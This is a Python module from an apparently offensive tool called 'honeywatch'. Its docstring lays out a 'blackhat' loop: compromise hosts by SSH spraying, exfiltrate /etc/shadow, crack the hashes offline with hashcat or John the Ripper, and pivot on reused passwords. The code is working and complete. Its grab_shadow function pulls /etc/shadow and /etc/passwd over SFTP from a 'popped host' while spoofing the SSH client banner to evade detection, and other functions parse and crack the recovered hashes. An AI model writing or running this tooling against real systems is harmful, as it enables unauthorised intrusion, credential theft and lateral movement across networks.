"""Offline hash cracking for honeywatch (hashcat / John the Ripper).

The blackhat growth loop the cracker enables:

  pop a box (online SSH spray) -> exfil /etc/shadow -> crack the hashes
  OFFLINE with hashcat or john -> recover plaintext passwords -> persist them
  to the credentials table -> pivot across the fleet on password reuse.

This module shells out to the real ``hashcat`` and ``john`` binaries (the
operator installs them; none are bundled). Everything is real: it parses
``/etc/shadow``, detects the crypt family, writes a tool-native hash file,
runs the binary, and reads the cracked pot back. No dummy data, no mocks in
the production paths.

Contracts:

- Every public function returns a structured result and **never raises** on
  a missing binary or a failed run -- the outcome is described by ``error`` /
  ``returncode`` fields so the CLI and agent layer can render results without
  try/except ladders.
- ``paramiko`` is reused (lazily, same optional dep as the fingerprint probe)
  for the SFTP shadow grab so no new hard dependency is introduced.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
import tempfile
from dataclasses import dataclass, field
from typing import Any, Iterable

from honeywatch.opsec import spoofed_ssh_banner_for_target as _spoofed_ssh_banner_for_target

__all__ = [
    "CrackedHash",
    "HashCrackResult",
    "ShadowEntry",
    "crack_shadow",
    "crack_with_hashcat",
    "crack_with_john",
    "detect_hash_type",
    "grab_shadow",
    "parse_shadow",
]

# crypt(3) prefix -> (hashcat -m mode, john format name, human name).
# Covers every common Linux /etc/shadow hash family a popped box will hand
# you. ``mode None`` means the tool does not support that family (yescrypt in
# hashcat is experimental / mode 22500; we fall back to john there).
_HASH_TYPES: list[tuple[str, int | None, str, str]] = [
    ("$6$", 1800, "sha512crypt", "sha512crypt"),
    ("$5$", 7400, "sha256crypt", "sha256crypt"),
    ("$1$", 500, "md5crypt", "md5crypt"),
    ("$y$", 22500, "yescrypt", "yescrypt"),
    ("$gy$", 22500, "gost-yescrypt", "gost-yescrypt"),
    ("$2b$", 3200, "bcrypt", "bcrypt"),
    ("$2a$", 3200, "bcrypt", "bcrypt"),
    ("$2y$", 3200, "bcrypt", "bcrypt"),
    ("$argon2i$", None, "argon2", "argon2"),
    ("$argon2id$", None, "argon2", "argon2"),
    ("$sha1$", 110, "sha1crypt", "sha1crypt"),
    ("$pbkdf2$", 12100, "pbkdf2", "pbkdf2"),
]

# A shadow entry that is empty, locked ("!" / "*" / "!!"), or a legacy DES
# crypt is skipped -- nothing to crack, and DES is vanishingly rare on modern
# boxes. The "^" prefix on modern shadow fields marks a "must change" flag,
# not the hash.
_SKIP_TOKENS = ("", "*", "!", "!!", "x")


# --------------------------------------------------------------------------- #
# Data models
# --------------------------------------------------------------------------- #


@dataclass
class ShadowEntry:
    """One parsable row from /etc/shadow plus the detected crypt family."""

    user: str
    hash: str
    hashcat_mode: int | None = None
    john_format: str | None = None
    family: str = ""

    def is_crackable(self) -> bool:
        return bool(self.hash) and self.family != ""


@dataclass
class CrackedHash:
    user: str
    hash: str
    password: str | None = None
    success: bool = False
    error: str | None = None


@dataclass
class HashCrackResult:
    tool: str
    wordlist: str | None = None
    mode: int | None = None
    john_format: str | None = None
    attempted: int = 0
    cracked: list[CrackedHash] = field(default_factory=list)
    returncode: int | None = None
    stdout: str = ""
    stderr: str = ""
    error: str | None = None
    potfile: str | None = None

    @property
    def success_count(self) -> int:
        return sum(1 for c in self.cracked if c.success)

    def credentials(self) -> list[dict[str, Any]]:
        """Flat list of recovered {user, password, hash} dicts."""
        return [
            {"user": c.user, "password": c.password, "hash": c.hash}
            for c in self.cracked
            if c.success and c.password is not None
        ]


# --------------------------------------------------------------------------- #
# Shadow parsing + type detection
# --------------------------------------------------------------------------- #


def detect_hash_type(h: str) -> tuple[int | None, str, str]:
    """Return (hashcat_mode, john_format, family_name) for a crypt hash.

    Returns ``(None, "", "")`` for an unrecognized / uncrackable hash.
    """
    for prefix, mode, family, fmt in _HASH_TYPES:
        if h.startswith(prefix):
            return mode, fmt, family
    # Bare 13-char DES crypt (legacy) -- john handles as "descrypt", hashcat -m
    # 1500, but it's almost never seen on a modern popped box.
    if len(h) == 13 and re.fullmatch(r"[./0-9A-Za-z]{13}", h):
        return 1500, "descrypt", "descrypt"
    return None, "", ""


def parse_shadow(shadow_text: str, passwd_text: str | None = None) -> list[ShadowEntry]:
    """Parse /etc/shadow into ShadowEntry rows, skipping nothing-to-crack rows.

    ``passwd_text`` is accepted for symmetry (some operators glue the two
    files) but the shadow file already carries the username, so it is unused
    unless a shadow row has an empty user (which never happens in practice).
    """
    entries: list[ShadowEntry] = []
    if not shadow_text:
        return entries
    for line in shadow_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # /etc/shadow: user:hash:lastchange:min:max:warn:inactive:expire:reserved
        parts = line.split(":")
        if len(parts) < 2:
            continue
        user = parts[0]
        h = parts[1]
        if h in _SKIP_TOKENS or h.startswith("^"):
            continue
        mode, fmt, family = detect_hash_type(h)
        if family == "":
            continue
        entries.append(
            ShadowEntry(
                user=user, hash=h, hashcat_mode=mode, john_format=fmt, family=family
            )
        )
    return entries


# --------------------------------------------------------------------------- #
# Hashcat / john runners
# --------------------------------------------------------------------------- #


def _run(argv: list[str], timeout_s: float | None, env: dict[str, str] | None = None,
         cwd: str | None = None) -> tuple[int | None, str, str, str | None]:
    """Run a subprocess, returning (returncode, stdout, stderr, error).

    ``returncode`` is ``None`` and ``error`` set when the binary is missing or
    the run times out. Never raises.
    """
    try:
        proc = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=timeout_s,
            env=env,
            cwd=cwd,
        )
    except FileNotFoundError:
        return None, "", "", f"binary not found: {argv[0]}"
    except OSError as exc:
        # Any other launch failure (permissions, exec format, etc.) -- don't
        # let it escape and leak the caller's temp dir; honor "never raises".
        return None, "", "", f"failed to launch {argv[0]}: {exc}"
    except subprocess.TimeoutExpired as exc:
        out = exc.stdout or ""
        err = exc.stderr or ""
        if isinstance(out, bytes):
            out = out.decode("utf-8", "replace")
        if isinstance(err, bytes):
            err = err.decode("utf-8", "replace")
        return None, str(out), str(err), f"timed out after {timeout_s}s"
    except Exception as exc:  # pragma: no cover - defensive
        return None, "", "", f"{type(exc).__name__}: {exc}"
    return proc.returncode, proc.stdout, proc.stderr, None


def _write_hashfile(entries: Iterable[ShadowEntry], path: str) -> int:
    """Write ``user:hash`` lines (john-style) for the given entries.

    hashcat accepts ``hash`` only; john accepts ``user:hash``. We write the
    ``user:hash`` form and strip the user prefix for hashcat, so one file
    serves both tools.
    """
    count = 0
    with open(path, "w", encoding="utf-8") as fh:
        for e in entries:
            fh.write(f"{e.user}:{e.hash}\n")
            count += 1
    return count


def crack_with_hashcat(
    entries: list[ShadowEntry],
    wordlist: str,
    mode: int | None = None,
    bin_path: str = "hashcat",
    extra_args: list[str] | None = None,
    potfile: str | None = None,
    timeout_s: float | None = None,
    force_mode: bool = False,
) -> HashCrackResult:
    """Crack ``entries`` with hashcat using a dictionary attack (-a 0).

    All entries must share the same hashcat mode (same crypt family); pass
    ``mode`` to override detection, or ``force_mode=True`` to skip the
    per-entry consistency check. Cracked plaintexts are read back from the
    potfile with ``hashcat --show``.
    """
    result = HashCrackResult(tool="hashcat", wordlist=wordlist, mode=mode)
    if not entries:
        result.error = "no crackable shadow entries"
        return result
    if not os.path.isfile(wordlist):
        result.error = f"wordlist not found: {wordlist}"
        return result

    if mode is None:
        modes = {e.hashcat_mode for e in entries}
        modes.discard(None)
        if not modes:
            result.error = "no supported hashcat mode for these hashes"
            return result
        if len(modes) > 1 and not force_mode:
            result.error = (
                "mixed hash families in one run are not supported by a single "
                f"hashcat call (modes {sorted(modes)}); split by family or set "
                "force_mode=True"
            )
            return result
        mode = next(iter(modes))

    tmp_dir: str | None = None
    try:
        tmp_dir = tempfile.mkdtemp(prefix="honeywatch_hashcat_")
        # hashcat wants bare hashes (no user prefix); emit just those.
        bare_hashfile = os.path.join(tmp_dir, "bare.txt")
        with open(bare_hashfile, "w", encoding="utf-8") as fh:
            for e in entries:
                fh.write(e.hash + "\n")
        if potfile is None:
            potfile = os.path.join(tmp_dir, "hashcat.potfile")

        argv = [
            bin_path,
            "-m", str(mode),
            "-a", "0",
            "--potfile-path", potfile,
            "--quiet",
            bare_hashfile,
            wordlist,
        ]
        if extra_args:
            argv += list(extra_args)

        rc, out, err, run_error = _run(argv, timeout_s)
        result.returncode = rc
        result.stdout = out
        result.stderr = err
        result.potfile = potfile
        if run_error:
            result.error = run_error
            return result

        # Read back cracked passwords with --show. hashcat --show prints
        # ``hash:password`` for recovered hashes.
        show_argv = [bin_path, "-m", str(mode), "--potfile-path", potfile,
                     "--show", bare_hashfile]
        rc2, out2, err2, run_error2 = _run(show_argv, timeout_s, )
        if run_error2:
            # If --show failed we still return what the run produced.
            result.cracked = [CrackedHash(user=e.user, hash=e.hash, success=False,
                                         error="show-failed") for e in entries]
        else:
            recovered = _parse_hashcat_show(out2)
            for e in entries:
                pw = recovered.get(e.hash)
                result.cracked.append(
                    CrackedHash(user=e.user, hash=e.hash, password=pw,
                                success=pw is not None)
                )
        result.attempted = len(entries)
        return result
    except Exception as exc:
        # Never-raises contract: mkdtemp, open(), or an unexpected path can
        # raise OSError; capture it as result.error instead of propagating.
        if not result.error:
            result.error = f"{type(exc).__name__}: {exc}"
        return result
    finally:
        # Always reclaim the temp dir, even if an unexpected exception escapes
        # _run's "never raises" contract or a file write fails.
        if tmp_dir is not None:
            _cleanup(tmp_dir)


def _parse_hashcat_show(text: str) -> dict[str, str]:
    """Map ``hash -> password`` from ``hashcat --show`` output."""
    out: dict[str, str] = {}
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        # hash:password  (some hashes contain '$' but not ':' in the hash
        # body for the families we support, so the first ':' is the split).
        h, _, pw = line.partition(":")
        if pw is not None and pw != "" and h:
            out[h] = pw
    return out


def crack_with_john(
    entries: list[ShadowEntry],
    wordlist: str,
    bin_path: str = "john",
    extra_args: list[str] | None = None,
    potfile: str | None = None,
    timeout_s: float | None = None,
) -> HashCrackResult:
    """Crack ``entries`` with John the Ripper using a wordlist.

    john reads ``user:hash`` lines directly (the shadow format), so the same
    file serves as input. Cracked plaintexts are read back with
    ``john --show``.
    """
    result = HashCrackResult(tool="john", wordlist=wordlist)
    if not entries:
        result.error = "no crackable shadow entries"
        return result
    if not os.path.isfile(wordlist):
        result.error = f"wordlist not found: {wordlist}"
        return result

    fmts = {e.john_format for e in entries if e.john_format}
    result.john_format = next(iter(fmts), None) if len(fmts) == 1 else None

    tmp_dir: str | None = None
    try:
        tmp_dir = tempfile.mkdtemp(prefix="honeywatch_john_")
        hashfile = os.path.join(tmp_dir, "shadow.txt")
        _write_hashfile(entries, hashfile)
        if potfile is None:
            potfile = os.path.join(tmp_dir, "john.pot")

        argv = [bin_path, f"--wordlist={wordlist}", f"--pot={potfile}"]
        if result.john_format:
            argv.append(f"--format={result.john_format}")
        if extra_args:
            argv += list(extra_args)
        argv.append(hashfile)

        rc, out, err, run_error = _run(argv, timeout_s)
        result.returncode = rc
        result.stdout = out
        result.stderr = err
        result.potfile = potfile
        if run_error:
            result.error = run_error
            return result

        # john --show prints "user:password" lines plus a summary count.
        show_argv = [bin_path, "--show", f"--pot={potfile}", hashfile]
        if result.john_format:
            show_argv.append(f"--format={result.john_format}")
        rc2, out2, err2, run_error2 = _run(show_argv, timeout_s)
        if run_error2:
            result.cracked = [CrackedHash(user=e.user, hash=e.hash, success=False,
                                          error="show-failed") for e in entries]
        else:
            recovered = _parse_john_show(out2)
            for e in entries:
                pw = recovered.get(e.user)
                result.cracked.append(
                    CrackedHash(user=e.user, hash=e.hash, password=pw,
                                success=pw is not None)
                )
        result.attempted = len(entries)
        return result
    except Exception as exc:
        if not result.error:
            result.error = f"{type(exc).__name__}: {exc}"
        return result
    finally:
        if tmp_dir is not None:
            _cleanup(tmp_dir)


def _parse_john_show(text: str) -> dict[str, str]:
    """Map ``user -> password`` from ``john --show`` output."""
    out: dict[str, str] = {}
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        # Stop at the trailing summary line ("N password hashes cracked...").
        if line.lower().startswith(("0 ", "1 ", "2 ", "3 ", "4 ", "5 ", "6 ",
                                    "7 ", "8 ", "9 ")) and "cracked" in line.lower():
            break
        user, _, rest = line.partition(":")
        if not user or not rest:
            continue
        # rest may be "password:hash:..." -- the password is the first field.
        pw = rest.split(":", 1)[0]
        if pw:
            out[user] = pw
    return out


def crack_shadow(
    shadow_path: str,
    wordlist: str,
    tool: str = "hashcat",
    passwd_path: str | None = None,
    bin_path: str | None = None,
    mode: int | None = None,
    extra_args: list[str] | None = None,
    timeout_s: float | None = None,
) -> HashCrackResult:
    """High-level: parse a shadow file, pick the tool, crack, return result.

    ``tool`` is ``"hashcat"`` or ``"john"``. Mixed-family shadow files are
    split by crypt family and each family is cracked in its own run, with the
    per-family results merged into one HashCrackResult.
    """
    try:
        with open(shadow_path, "r", encoding="utf-8", errors="replace") as fh:
            shadow_text = fh.read()
    except OSError as exc:
        return HashCrackResult(tool=tool, error=f"cannot read {shadow_path}: {exc}")
    passwd_text = None
    if passwd_path:
        try:
            with open(passwd_path, "r", encoding="utf-8", errors="replace") as fh:
                passwd_text = fh.read()
        except OSError:
            passwd_text = None

    entries = parse_shadow(shadow_text, passwd_text)
    if not entries:
        return HashCrackResult(tool=tool, error="no crackable entries in shadow file")

    # Split by crypt family so hashcat (single-mode) gets a clean run per
    # family; john benefits too (it auto-detects but an explicit --format
    # is more reliable).
    by_family: dict[str, list[ShadowEntry]] = {}
    for e in entries:
        by_family.setdefault(e.family, []).append(e)

    merged = HashCrackResult(tool=tool, wordlist=wordlist, mode=mode)
    merged.attempted = len(entries)
    merged.returncode = 0
    for family, group in by_family.items():
        if tool == "hashcat":
            family_mode = mode if mode is not None else group[0].hashcat_mode
            res = crack_with_hashcat(
                group, wordlist, mode=family_mode,
                bin_path=bin_path or "hashcat",
                extra_args=extra_args, timeout_s=timeout_s,
            )
        elif tool == "john":
            res = crack_with_john(
                group, wordlist, bin_path=bin_path or "john",
                extra_args=extra_args, timeout_s=timeout_s,
            )
        else:
            return HashCrackResult(tool=tool,
                                    error=f"unknown tool: {tool!r} (use hashcat or john)")
        merged.cracked.extend(res.cracked)
        if res.error and not merged.error:
            merged.error = f"{family}: {res.error}"
        # Aggregate returncode across families: a non-zero (failure) from any
        # family is preserved; a later successful family must not overwrite it
        # back to 0. Only stays 0 when every family that ran returned 0.
        if res.returncode not in (None, 0) and merged.returncode == 0:
            merged.returncode = res.returncode
        merged.stdout += res.stdout
        merged.stderr += res.stderr
    return merged


# --------------------------------------------------------------------------- #
# Shadow exfiltration over SSH (closes the online -> offline loop)
# --------------------------------------------------------------------------- #


# Private key types to try, in order. paramiko has no universal loader that
# picks the class from the file header, so we try each until one parses. This
# supports ed25519/ecdsa/rsa/dss keys instead of only RSA.
_KEY_CLASSES = ("Ed25519Key", "ECDSAKey", "RSAKey", "DSSKey")


def _load_private_key(paramiko_module: Any, key_path: str) -> Any:
    """Load a private key file, trying each paramiko key class in turn."""
    last_exc: Exception | None = None
    for cls_name in _KEY_CLASSES:
        cls = getattr(paramiko_module, cls_name, None)
        if cls is None:
            continue
        try:
            return cls.from_private_key_file(key_path)
        except Exception as exc:  # wrong key type -> try the next class
            last_exc = exc
            continue
    raise paramiko_module.SSHException(
        f"could not load private key {key_path!r}: {last_exc!r}"
    )


def grab_shadow(
    ip: str,
    port: int = 22,
    user: str | None = None,
    password: str | None = None,
    key_path: str | None = None,
    stash_dir: str = ".honeywatch/shadow_stash",
    timeout_s: float = 10.0,
    shadow_remote: str = "/etc/shadow",
    passwd_remote: str = "/etc/passwd",
) -> dict[str, Any]:
    """SFTP-grab /etc/shadow (+ /etc/passwd) from a popped host.

    Uses paramiko (the same optional dep as the full fingerprint probe). The
    files land in ``<stash_dir>/<ip>/shadow`` and ``<stash_dir>/<ip>/passwd`` so
    a re-grab overwrites the same stash. Returns a dict with the local paths
    and any error; never raises.
    """
    out: dict[str, Any] = {"ip": ip, "port": port, "user": user}
    try:
        import paramiko  # type: ignore[import-not-found]
    except Exception as exc:
        out["error"] = f"paramiko unavailable: {exc!r}"
        return out

    if not user:
        out["error"] = "no ssh user supplied"
        return out
    if not password and not key_path:
        out["error"] = "no credential supplied (need password or key)"
        return out

    # Sanitize the IP to prevent path traversal (e.g. "../../etc").
    safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
    ip_dir = os.path.join(stash_dir, safe_ip)
    os.makedirs(ip_dir, exist_ok=True)
    local_shadow = os.path.join(ip_dir, "shadow")
    local_passwd = os.path.join(ip_dir, "passwd")

    transport = None
    try:
        # Build the socket with an explicit connect timeout so a blackholed
        # foothold cannot stall the chain indefinitely (paramiko.Transport((ip,
        # port)) connects with no timeout of its own). This is the same
        # pattern already used in opsec.auth_methods / spray._paramiko_attempt.
        import socket as _socket

        sock = _socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        transport = paramiko.Transport(sock)
        banner = _spoofed_ssh_banner_for_target(ip, port)
        transport._CLIENT_IDENTITY = banner
        transport.local_version = banner
        transport.set_timeout(timeout_s)
        transport.start_client(timeout=timeout_s)
        if key_path:
            pkey = _load_private_key(paramiko, key_path)
            transport.auth_publickey(user, pkey)
        else:
            transport.auth_password(user, password or "")
        sftp = paramiko.SFTPClient.from_transport(transport)
        if sftp is None:
            out["error"] = "SFTP channel unavailable (server may not allow sftp)"
            return out
        # /etc/shadow is mode 000 readable only by root; we rely on the popped
        # account having read access (root, or sudo with no tty). If the read
        # fails the result records the SFTP error rather than crashing.
        sftp.get(shadow_remote, local_shadow)
        try:
            sftp.get(passwd_remote, local_passwd)
        except Exception as exc:
            # passwd is best-effort; shadow already carries the usernames.
            local_passwd = ""
            out["passwd_error"] = f"{exc!r}"
        sftp.close()
        out["shadow_path"] = local_shadow
        out["passwd_path"] = local_passwd or None
    except paramiko.AuthenticationException as exc:
        out["error"] = f"auth failed: {exc!r}"
    except (paramiko.SSHException, OSError, EOFError) as exc:
        out["error"] = f"{type(exc).__name__}: {exc}"
    except Exception as exc:  # pragma: no cover - defensive
        out["error"] = f"{type(exc).__name__}: {exc}"
    finally:
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass
    return out


def _cleanup(path: str) -> None:
    """Best-effort remove of a temp crack dir (hash files + potfile)."""
    try:
        for name in os.listdir(path):
            try:
                os.remove(os.path.join(path, name))
            except OSError:
                pass
        os.rmdir(path)
    except OSError:
        pass


def _shlex_split(value: str) -> list[str]:
    """Split a user-supplied extra-args string the way a shell would.

    Kept as a small public helper for callers that want shell-style splitting
    of ``extra_args``; the crack functions themselves take pre-split lists.
    """
    return shlex.split(value) if value else []